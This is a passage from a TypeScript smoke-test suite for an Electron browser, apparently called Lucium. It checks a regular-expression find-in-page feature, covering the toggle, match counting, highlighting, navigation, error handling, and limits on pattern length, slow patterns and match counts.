        check('settings: a real click on "Calculatrice" switches it', await waitFor(() => state().settings.commandBarCalc === !before, 3000), JSON.stringify({ commandBarCalc: state().settings.commandBarCalc, clickedAt: calcSwitch }))
        patch({ commandBarCalc: before })
      } else check('settings: the Calculatrice row is there', false, JSON.stringify(texts))
      sw?.close()
      await waitFor(() => !BrowserWindow.getAllWindows().some((w) => w.getTitle() === 'Réglages'))
    } else check('settings: the Settings window opened', false)

    // ===================================================== find by regular expression =====================================================
    patch({ findRegex: false })
    const findTab = await open('/find', 'find page')
    const findWc = wcOf(findTab)!
    const finderOf = (id: string) => (browser.pageFor(id) as unknown as { regexFinder: unknown }).regexFinder
    const counter = () => evaluate<string>(ui, `document.querySelector('.fb-count')?.textContent ?? ''`)
    const openFind = async () => {
      browser.openOverlay({ panel: 'find' })
      await waitFor(() => focused('.fb-input'), 4000)
      await sleep(150)
    }
    const centre = async (selector: string) => {
      const r = await evaluate<{ x: number; y: number; width: number; height: number } | null>(ui, `(() => { const el = document.querySelector(${JSON.stringify(selector)}); if (!el) return null; const r = el.getBoundingClientRect(); return { x: r.x, y: r.y, width: r.width, height: r.height } })()`)
      return r ? { x: r.x + r.width / 2, y: r.y + r.height / 2 } : null
    }
    /** Empties the field of the bar with the Backspace key. */
    const clearField = async () => {
      const length = await evaluate<number>(ui, `document.querySelector('.fb-input')?.value.length ?? 0`)
      await key('Backspace', [], length + 1)
    }
    const highlights = (wc: WebContents) => evaluate<number>(wc, `CSS.highlights ? [...CSS.highlights.keys()].filter((k) => k.startsWith('lucium-find')).length : 0`)
    /** Pixels of the page close to a colour (the page is captured as it is drawn, at the screen's scale). */
    const pixelsNear = async (wc: WebContents, [r, g, b]: [number, number, number]) => {
      const image = await wc.capturePage()
      const bitmap = image.toBitmap()
      let n = 0
      for (let i = 0; i + 3 < bitmap.length; i += 4) if (Math.abs(bitmap[i + 2]! - r) < 14 && Math.abs(bitmap[i + 1]! - g) < 14 && Math.abs(bitmap[i]! - b) < 14) n++
      return n
    }

    await openFind()
    check('find: with the setting off the bar has no ".*" button (it stays as Arc draws it)', (await centre('[data-find-toggle="regex"]')) === null)
    await typeText('\\d{4}')
    check('find: and a regular expression is only text for the ordinary search (the request is not honoured)', browser.snapshot().find?.regex === undefined && /^0\/0$/.test(await counter()), `${await counter()} ${JSON.stringify(browser.snapshot().find)}`)
    browser.findInPage('\\d{4}', { regex: true })
    // No wait: findInPage decides before it returns, and the option it honours makes the finder of the tab at once (electron-page-navigation.ts).
    check('find: asking for a regular expression through the API changes nothing either, and the tab holds nothing for it', browser.snapshot().find?.regex === undefined && finderOf(findTab) === null, JSON.stringify(browser.snapshot().find))
    await key('Escape')
    await waitFor(() => browser.currentPanel() === null)

    patch({ findRegex: true })
    await openFind()
    const toggle = await centre('[data-find-toggle="regex"]')
    check('find: with the setting on the bar has a ".*" button, not pressed', !!toggle && (await evaluate<string>(ui, `document.querySelector('[data-find-toggle="regex"]').getAttribute('aria-pressed')`)) === 'false')
    if (toggle) await click(ui, toggle.x, toggle.y)
    check('find: a click on it presses it', (await evaluate<string>(ui, `document.querySelector('[data-find-toggle="regex"]').getAttribute('aria-pressed')`)) === 'true')
    await clearField()
    await typeText('\\d{4}')
    check('find: "\\d{4}" counts the two years of the page (hidden text, a script and a style are left out)', await waitFor(async () => (await counter()) === '1/2', 6000), await counter())
    // Previous and next only exist once there is something typed.
    check('find: and the other buttons are as before (previous, next, close at 28 x 28)', (await evaluate<number>(ui, `[...document.querySelectorAll('.fb-btn')].filter((b) => { const r = b.getBoundingClientRect(); return Math.round(r.width) === 28 && Math.round(r.height) === 28 }).length`)) === 3)
    check('find: the bar says the search is a regular expression', browser.snapshot().find?.regex === true)
    const olive = await pixelsNear(findWc, [0xa5, 0xa6, 0x23])
    const orange = await pixelsNear(findWc, [0xff, 0x96, 0x33])
    check('find: the matches are painted on the page (olive), the current one in orange', olive > 150 && orange > 80, JSON.stringify({ olive, orange }))
    await key('Return')
    check('find: Enter goes to the next match (2/2)', await waitFor(async () => (await counter()) === '2/2'), await counter())
    await key('Return')
    check('find: and round to the first (1/2)', await waitFor(async () => (await counter()) === '1/2'), await counter())
    await key('Return', ['shift'])
    check('find: Shift+Enter goes back (2/2)', await waitFor(async () => (await counter()) === '2/2'), await counter())

    await clearField()
    await typeText('PLANÈTE')
    check('find: the case is ignored (two "planète")', await waitFor(async () => (await counter()) === '1/2', 6000), await counter())
    await clearField()
    await typeText('o wor')
    check('find: a match may run across inline elements ("Hello <b>wor</b>ld")', await waitFor(async () => (await counter()) === '1/1', 6000), await counter())
    await clearField()
    await typeText('5555|7777|8888')
    check('find: text that is hidden, in a script or in a style is not found', await waitFor(async () => (await counter()) === '0/0', 6000), await counter())
    await clearField()
    await typeText('(')
    check('find: an invalid expression says so in the counter', await waitFor(async () => (await counter()) === REGEX_ERROR_LABELS.invalid, 6000), await counter())
    check('find: the counter shows it as an error and nothing stays painted', (await evaluate<string>(ui, `document.querySelector('.fb-count').className`)).includes('fb-error') && (await highlights(findWc)) === 0)
    await clearField()
    await typeText('\\d+')
    check('find: and a valid one works again at once', await waitFor(async () => /^1\/\d+$/.test(await counter()), 6000), await counter())

    // too long: refused without running
    browser.findInPage('a'.repeat(501), { regex: true })
    check('find: an expression over 500 characters is refused', await waitFor(() => browser.snapshot().find?.error === 'too-long', 4000), JSON.stringify(browser.snapshot().find))

    // Escape cleans the page
    await clearField()
    await typeText('\\d+')
    await waitFor(async () => /^1\/\d+$/.test(await counter()), 6000)
    check('find: the page holds highlights while the bar is open', (await highlights(findWc)) === 2, String(await highlights(findWc)))
    await key('Escape')
    check('find: Escape closes the bar and takes the highlights off the page', (await waitFor(() => browser.currentPanel() === null)) && (await waitFor(async () => (await highlights(findWc)) === 0)), String(await highlights(findWc)))
    check('find: the style of the highlights is gone with them', (await pixelsNear(findWc, [0xa5, 0xa6, 0x23])) < 20)

    // a catastrophic expression is abandoned, and the page keeps answering
    const slowTab = await open('/slow', 'slow page')
    const slowWc = wcOf(slowTab)!
    await openFind()
    const press = await centre('[data-find-toggle="regex"]')
    if (press && (await evaluate<string>(ui, `document.querySelector('[data-find-toggle="regex"]').getAttribute('aria-pressed')`)) !== 'true') await click(ui, press.x, press.y)
    await typeText('(a+)+b')
    const started = Date.now()
    let slowest = 0
    while (Date.now() - started < 900) {
      const t0 = Date.now()
      await slowWc.executeJavaScript('document.title')
      slowest = Math.max(slowest, Date.now() - t0)
      await sleep(40)
    }
    check('find: while a catastrophic expression runs the page keeps answering', slowest < 500, `${slowest} ms`)
    check('find: it is abandoned, and the counter says "Trop lent"', await waitFor(async () => (await counter()) === REGEX_ERROR_LABELS.slow, 6000), await counter())
    await clearField()
    await typeText('a+c')
    check('find: and the next expression is searched at once', await waitFor(async () => (await counter()) === '1/1', 6000), await counter())
    await key('Escape')
    await waitFor(() => browser.currentPanel() === null)

    // limits: more text than the search reads, more matches than it counts
    await open('/big', 'big')
    await openFind()
    const press2 = await centre('[data-find-toggle="regex"]')
    if (press2 && (await evaluate<string>(ui, `document.querySelector('[data-find-toggle="regex"]').getAttribute('aria-pressed')`)) !== 'true') await click(ui, press2.x, press2.y)
    await typeText('ipsum')
    check('find: past the limit the count stops and says so ("1/2000+")', await waitFor(async () => (await counter()) === `1/${REGEX_MATCH_MAX}+`, 20_000), await counter())
    await key('Escape')
    await waitFor(() => browser.currentPanel() === null)
  } finally {
    // Every setting this suite touched goes back to what it was.
    patch({
      searchSuggestions: suggestionsBefore,
      commandBarCalc: saved.commandBarCalc,
      searchBangs: saved.searchBangs,
      searchDiscovery: saved.searchDiscovery,
      searchDiscoverySeen: saved.searchDiscoverySeen,
      suggestHistory: saved.suggestHistory,
      suggestTabs: saved.suggestTabs,
      suggestArchive: saved.suggestArchive,
      suggestReadLater: saved.suggestReadLater,
      findRegex: saved.findRegex,
      siteSearches: saved.siteSearches
    })
    browser.closeOverlay()
    for (const id of mine) browser.dispatch({ type: 'tab/close', id })
    server.close()
    server.closeAllConnections()
  }
}

/** `LUCIUM_SMOKE_ONLY=search2`: only these checks, with their own report. */
export async function runSearch2Smoke(ctx: SmokeContext): Promise<number> {
  const checks: Array<{ name: string; ok: boolean; detail?: string }> = []
  try {
    await smokeSearch2(ctx, recorderOf(checks))
  } catch (error) {
    noteCheck(checks, 'smokeSearch2 ran to the end', false, String((error as Error)?.stack ?? error))
  }
  const failed = checks.filter((c) => !c.ok)
  console.log(`LUCIUM_SMOKE_SEARCH2 ${JSON.stringify({ checks, failed: failed.length }, null, 2)}`)
  return failed.length === 0 ? 0 : 1
}
